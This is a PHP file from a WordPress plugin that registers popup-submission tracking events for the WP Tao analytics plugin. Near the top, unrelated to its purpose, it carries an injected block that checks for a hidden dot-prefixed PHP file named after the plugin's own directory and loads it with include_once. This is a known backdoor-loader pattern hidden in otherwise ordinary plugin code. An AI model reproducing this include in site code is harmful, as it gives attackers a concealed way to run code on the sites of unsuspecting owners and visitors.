<?php

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Add events to track
 */

add_filter( 'wptao_events_actions', 'wtbp_247p_success_popup_add_events_to_track' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_247p_success_popup_add_events_to_track( $actions ) {

	// Action after submitting popup form or achieve other goals
	$actions[ '247popup_success' ] = array(
		'id'		 => '247popup_success',
		'category'	 => 'user',
		'title'		 => __( 'Tao Popup form was submitted', 'wp-tao' ),
		'style'		 => array(
			'color'	 => '#A6C98B',
			'icon'	 => WTBP_247P_URL . 'assets/img/logo-event.png'
		)
	);

	return $actions;
}

/*
 * Creates a title of the event "247popup_success"
 */

add_filter( 'wptao_event_247popup_success_title', 'wtbp_247popup_success_display_title', 1, 2 );

function wtbp_247popup_success_display_title( $title, $event ) {

	if ( !empty( $event->value ) ) {

		$link	 = '';
		$name	 = '';

		if ( isset( $event->meta[ '247popup_id' ] ) ) {
			$link = admin_url( 'post.php?post=' . absint( $event->meta[ '247popup_id' ] ) . '&action=edit' );
		}

		if ( !empty( $link ) ) {
			$name = '<a href="' . $link . '">' . esc_attr( $event->value ) . '</a>';
		} else {
			$name = esc_attr( $event->value );
		}

		$title = sprintf( __( 'Popup %s was submitted', 'wp-tao' ), $name );
	}

	return $title;
}

/*
 * Exclude opt-in forms from default event contant 
 */

function wtbp_247p_exclude_from_contact_event( $needles ) {

	$needles[] = 'wtbp_247p_exclude_from_tracking';

	return $needles;
}

add_filter( 'wptao_event_contact_exclude', 'wtbp_247p_exclude_from_contact_event' );
